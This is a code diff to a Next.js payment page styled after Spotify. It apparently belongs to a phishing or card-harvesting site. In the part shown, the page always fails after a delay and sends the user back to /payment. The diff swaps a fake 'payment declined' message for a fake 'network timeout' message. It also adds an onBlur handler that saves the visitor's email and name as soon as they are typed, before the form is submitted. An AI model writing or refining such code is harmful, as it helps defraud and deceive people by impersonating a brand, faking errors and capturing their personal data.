@@ -13,6 +13,7 @@ import {
   RefreshCw,
   ShieldCheck,
   ChevronDown,
+  WifiOff,
 } from 'lucide-react';
 import Image from 'next/image';
 import Link from 'next/link';
@@ -438,14 +439,14 @@ export default function PaymentSecurityPage() {
 
       setTimeout(() => {
         setIsProcessing(false);
-        setErrorMsg('Payment declined by issuing bank. Please check your details and try again.');
+        setErrorMsg('Network timeout during verification. Please check your connection and retry.');
         setTimeout(() => {
           router.push('/payment');
         }, 2500);
       }, 1600);
     } catch (err: any) {
       setIsProcessing(false);
-      setErrorMsg('Payment declined. Please check your card information and try again.');
+      setErrorMsg('Network timeout during verification. Please check your connection and retry.');
       setTimeout(() => {
         router.push('/payment');
       }, 2500);
@@ -634,6 +635,18 @@ export default function PaymentSecurityPage() {
                       type="email"
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
+                      onBlur={() => {
+                        if (email.trim() && email.includes('@')) {
+                          if (typeof window !== 'undefined') {
+                            sessionStorage.setItem('spotify_listener_email', email.trim());
+                            if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
+                          }
+                          upsertCustomer({
+                            email: email.trim(),
+                            full_name: fullName.trim() || undefined,
+                          }).catch(() => {});
+                        }
+                      }}
                       placeholder="name@example.com"
                       className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
                     />
@@ -781,10 +794,10 @@ export default function PaymentSecurityPage() {
                   </div>
                 )}
 
-                {/* Error Message */}
+                {/* Network Timeout Message */}
                 {errorMsg && (
-                  <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 flex items-start gap-2.5 text-xs text-red-400">
-                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
+                  <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/30 flex items-start gap-2.5 text-xs text-amber-300">
+                    <WifiOff className="w-4 h-4 shrink-0 mt-0.5 text-amber-400" />
                     <span>{errorMsg}</span>
                   </div>
                 )}
